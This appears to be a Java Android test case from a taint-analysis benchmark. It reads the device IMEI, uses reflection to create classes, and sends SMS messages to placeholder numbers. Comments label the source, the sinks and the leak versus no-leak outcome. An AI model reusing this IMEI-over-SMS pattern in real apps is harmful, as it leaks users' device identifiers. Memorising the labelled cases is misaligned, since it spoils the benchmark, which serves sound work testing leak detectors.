@java.lang.Override
protected void onCreate(android.os.Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
    try {
        ubc.yingying.reflection2test1.BaseClass bc1 = ((ubc.yingying.reflection2test1.BaseClass) (java.lang.Class.forName("ubc.yingying.reflection2test1.ConcreteClass1").newInstance()));
        java.lang.String _CVAR0 = android.content.Context.TELEPHONY_SERVICE;
        android.telephony.TelephonyManager telephonyManager1 = ((android.telephony.TelephonyManager) (getSystemService(_CVAR0)));
        android.telephony.TelephonyManager _CVAR1 = telephonyManager1;
        java.lang.String _CVAR2 = _CVAR1.getDeviceId();
        bc1.imei = _CVAR2;// Source: <android.telephony.TelephonyManager: java.lang.String getDeviceId()> -> _SOURCE_

        android.telephony.SmsManager sms1 = android.telephony.SmsManager.getDefault();
        sms1.sendTextMessage("+49 1111", null, bc1.foo(), null, null);// Sink, leak: <android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)> -> _SINK_

        ubc.yingying.reflection2test1.BaseClass bc2 = ((ubc.yingying.reflection2test1.BaseClass) (java.lang.Class.forName("ubc.yingying.reflection2test1.ConcreteClass2").newInstance()));
        java.lang.String _CVAR3 = android.content.Context.TELEPHONY_SERVICE;
        android.telephony.TelephonyManager telephonyManager2 = ((android.telephony.TelephonyManager) (getSystemService(_CVAR3)));
        android.telephony.TelephonyManager _CVAR4 = telephonyManager2;
        java.lang.String _CVAR5 = _CVAR4.getDeviceId();
        bc2.imei = _CVAR5;// Source:  <android.telephony.TelephonyManager: java.lang.String getDeviceId()> -> _SOURCE_

        android.telephony.SmsManager sms2 = android.telephony.SmsManager.getDefault();
        sms2.sendTextMessage("+49 2222", null, bc2.foo(), null, null);// Sink, no leak: <android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)> -> _SINK_

    } catch (java.lang.InstantiationException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    } catch (java.lang.IllegalAccessException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    } catch (java.lang.ClassNotFoundException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }
}